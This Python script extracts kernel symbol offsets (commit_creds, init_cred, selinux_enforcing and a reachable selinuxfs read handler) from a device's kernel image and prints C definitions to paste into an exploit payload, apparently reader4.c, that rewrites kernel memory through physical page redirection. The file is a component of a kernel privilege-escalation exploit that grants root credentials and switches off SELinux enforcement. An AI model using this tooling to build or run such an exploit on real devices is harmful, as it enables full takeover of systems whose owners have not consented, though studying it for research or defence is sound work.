#!/usr/bin/env python3
"""Recover the offsets reader4.c needs from a kernel image of the same build.

The payload hard-codes a handful of offsets into the kernel's text and data,
and every one of them has to be lifted from the image that is running on the
device.  This reads that image in the forms the extraction tools produce and
prints the definitions to paste into the source.

Usage:
    python extract-offsets.py kallsyms.txt              # symbol/address pairs
    python extract-offsets.py kernel.elf [llvm-nm[.exe]]
    python extract-offsets.py kernel.elf --nm=/path/to/llvm-nm.exe

An ELF is read through llvm-nm rather than by parsing the symbol table here.
The vmlinux-to-elf converter used on these images emits a symbol table whose
section header is not shaped the way the format specifies, so a strict parser
finds no symbols in a file that is otherwise perfectly usable.

The text base is the kernel's load address, 0xffffff8009080000 here.  What the
payload stores is the offset from that base, plus, for the physical write, the
0x1080000 difference between the kernel's virtual and physical placement.
"""

import os
import re
import subprocess
import sys

TEXT_BASE = 0xFFFFFF8009080000
PHYS_DELTA = 0x1080000

# name in the image -> name used by the payload
WANTED = [
    "commit_creds",
    "init_cred",
    "selinux_enforcing",
]

# The payload also needs a read handler that userspace can reach through
# selinuxfs.  Any node whose file operation points at a simple read handler
# works, but only handlers whose node the policy actually registers can ever be
# entered, so the list is ordered and the chosen one has to be confirmed
# against /sys/fs/selinux on the running device.
ANCHOR_CANDIDATES = [
    "sel_read_checkreqprot",
    "sel_read_handle_unknown",
    "sel_read_enforce",
]


def parse_symbol_dump(text):
    """Read `address type name` rows, as printed by nm or a symbol dump."""
    symbols = {}
    row = re.compile(r"^([0-9a-fA-F]{8,16})\s+(\S)\s+(\S+)\s*$")
    for line in text.splitlines():
        match = row.match(line.strip())
        if match:
            address, _kind, name = match.groups()
            symbols.setdefault(name, int(address, 16))
    return symbols


def load_kallsyms(path):
    with open(path, "r", encoding="utf-8", errors="replace") as handle:
        return parse_symbol_dump(handle.read())


def find_nm(explicit):
    if explicit:
        return explicit
    for name in ("llvm-nm", "llvm-nm.exe", "nm"):
        found = subprocess.run(["where" if os.name == "nt" else "which", name],
                               capture_output=True, text=True)
        if found.returncode == 0:
            return found.stdout.splitlines()[0].strip()
    raise SystemExit(
        "llvm-nm not found; pass its path with --nm=/path/to/llvm-nm.exe")


def load_elf(path, nm):
    result = subprocess.run([nm, path], capture_output=True, text=True)
    if result.returncode != 0:
        raise SystemExit("nm failed on %s: %s" % (path, result.stderr.strip()))
    return parse_symbol_dump(result.stdout)


def main():
    args = [a for a in sys.argv[1:] if not a.startswith("--nm=")]
    explicit_nm = next((a.split("=", 1)[1] for a in sys.argv[1:]
                        if a.startswith("--nm=")), None)
    if len(args) != 1:
        raise SystemExit(__doc__)
    path = args[0]

    symbols = (load_elf(path, find_nm(explicit_nm)) if path.endswith(".elf")
               else load_kallsyms(path))

    missing = [name for name in WANTED if name not in symbols]
    if missing:
        raise SystemExit("missing from the image: %s" % ", ".join(missing))

    anchor = next((n for n in ANCHOR_CANDIDATES if n in symbols), None)
    if anchor is None:
        raise SystemExit("none of the known read handlers is in the image")

    print("/* offsets recovered from %s */" % path)
    for name in WANTED:
        print("#define %-22s 0x%x" % (name.upper(), symbols[name] - TEXT_BASE))
    print("#define YNDX_SEL_READ_ANCHOR   0x%x   /* %s */"
          % (symbols[anchor] - TEXT_BASE, anchor))
    print()
    print("/* physical placement, for the page redirection */")
    for name in WANTED:
        print("/* %-22s phys 0x%x */"
              % (name, symbols[name] - TEXT_BASE + PHYS_DELTA))
    print()
    print("/* The anchor must name a file that exists in /sys/fs/selinux on the")
    print("   device: a handler whose node the policy never registers cannot be")
    print("   reached from userspace, whatever its address. */")


if __name__ == "__main__":
    main()
